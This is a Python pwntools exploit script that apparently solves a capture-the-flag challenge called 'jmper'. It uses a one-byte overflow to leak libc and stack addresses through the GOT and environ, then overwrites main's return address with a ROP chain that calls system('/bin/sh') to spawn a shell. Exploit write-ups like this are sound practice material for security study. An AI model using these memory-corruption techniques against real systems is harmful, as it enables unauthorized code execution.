#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'

io = process(['./jmper'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('jmper')
libc = ELF('libc-2.19.so')

pop_rdi_ret = 0x400cc3

def add():
    io.sendlineafter("Bye :)\n", '1')

def write_name(idx, content):
    io.sendlineafter("Bye :)\n", '2')
    io.sendlineafter("ID:", str(idx))
    io.sendlineafter("name:", content)

def write_memo(idx, content):
    io.sendlineafter("Bye :)\n", '3')
    io.sendlineafter("ID:", str(idx))
    io.sendlineafter("memo:", content)

def show_name(idx):
    io.sendlineafter("Bye :)\n", '4')
    io.sendlineafter("ID:", str(idx))

def show_memo(idx):
    io.sendlineafter("Bye :)\n", '5')
    io.sendlineafter("ID:", str(idx))

def overflow():
    add()   # idx 0
    add()   # idx 1
    write_memo(0, 'A'*0x20 + '\x78')

def leak():
    global system_addr
    global main_ret_addr

    write_name(0, p64(elf.got['puts']))
    show_name(1)
    puts_addr = (u64(io.recvline()[:6] + '\x00'*2))

    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    environ_addr = libc_base + libc.symbols['environ']

    write_name(0, p64(environ_addr))
    show_name(1)
    stack_addr = u64(io.recvline()[:6] + '\x00'*2)
    main_ret_addr = stack_addr - 0xf0

    log.info("libc base: 0x%x" % libc_base)
    log.info("system address: 0x%x" % system_addr)
    log.info("main return address: 0x%x" % main_ret_addr)

def overwrite():
    write_name(0, p64(0x602028))        # student_num
    write_name(1, '/bin/sh\x00')
    write_name(0, p64(main_ret_addr))
    write_name(1, p64(pop_rdi_ret) + p64(0x602028) + p64(system_addr))  # system('/bin/sh')

def pwn():
    add()   # call longjmp to back to main
    io.interactive()

if __name__ == "__main__":
    overflow()
    leak()
    overwrite()
    pwn()
